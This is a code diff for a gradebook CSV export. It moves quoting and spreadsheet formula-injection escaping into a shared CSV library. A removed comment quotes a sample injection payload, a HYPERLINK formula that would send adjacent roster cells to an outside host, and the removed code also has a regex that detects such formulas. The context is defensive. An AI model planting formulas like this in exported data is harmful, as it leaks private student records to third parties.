@@ -16,7 +16,7 @@
  */
 
 import { slugifyCohort } from "@/lib/courses/cohort-slug";
-import { displayNameOf } from "@/lib/people";
+import { csvLine, csvPersonName } from "@/lib/csv";
 
 /**
  * The parts of the gradebook payload a CSV reads, named structurally rather than taken from
@@ -87,48 +87,15 @@ export function gradebookIsEmpty(data: GradebookCsvData): boolean {
 }
 
 /**
- * Text a spreadsheet cannot misread, and cannot execute.
+ * Quoting, formula-injection escaping, and the test-student mark now live in `lib/csv.ts`.
  *
- * Two separate problems. Quoting is the CSV one: a comma, a quote, a newline, or an edge space
- * would otherwise split or shift a field, and a student who put a comma in their display name would
- * push their whole row one column to the right. Doubling the quote and wrapping is RFC 4180.
- *
- * The leading apostrophe is the other, and it is a security fix rather than a formatting one.
- * Display names are typed by people, and Excel and Google Sheets evaluate any cell beginning `=`,
- * `+`, `-`, or `@` as a formula when the file is opened — so a name of `=HYPERLINK("http://…"&A2)`
- * runs on an instructor's machine against the roster sitting beside it. Quoting alone does not stop
- * this; both spreadsheets parse the formula out of a quoted field. The apostrophe is what makes it
- * literal text, and it is applied only to fields that are text, so a negative number is untouched.
- */
-const NEEDS_QUOTING = /[",\r\n]|^\s|\s$/;
-const READS_AS_FORMULA = /^[=+\-@\t\r]/;
-
-function csvText(value: string): string {
-  const literal = READS_AS_FORMULA.test(value) ? `'${value}` : value;
-  return NEEDS_QUOTING.test(literal) ? `"${literal.replace(/"/g, '""')}"` : literal;
-}
-
-/** One record. Numbers pass through unquoted so they arrive as numbers; null is an empty cell. */
-function csvLine(fields: readonly (string | number | null)[]): string {
-  return fields
-    .map((field) => {
-      if (field == null) return "";
-      return typeof field === "number" ? String(field) : csvText(field);
-    })
-    .join(",");
-}
-
-/**
- * Whatever this student is best called, and whether they are real.
- *
- * The badge the grid draws beside a seeded student has to survive into the file, because the file
- * is where it matters most: a test row on screen is marked, and the same row in a spreadsheet of
- * cohort results is indistinguishable from a student who has fallen behind. In words rather than a
- * column of its own, since that is what the grid does — the mark belongs to the name.
+ * They moved when attendance gained an export of its own. A guard against a spreadsheet executing
+ * a name somebody typed has to exist exactly once — a second copy is the one that falls behind —
+ * and attendance's most dangerous field is worse than this file's, being a note a fellow wrote
+ * that no instructor reviewed on the way through.
  */
 function csvStudentName(student: GradebookCsvPerson): string {
-  const name = displayNameOf(student, "Unknown student");
-  return student.testStudentNumber === null ? name : `${name} (test student)`;
+  return csvPersonName(student, "Unknown student");
 }
 
 /**
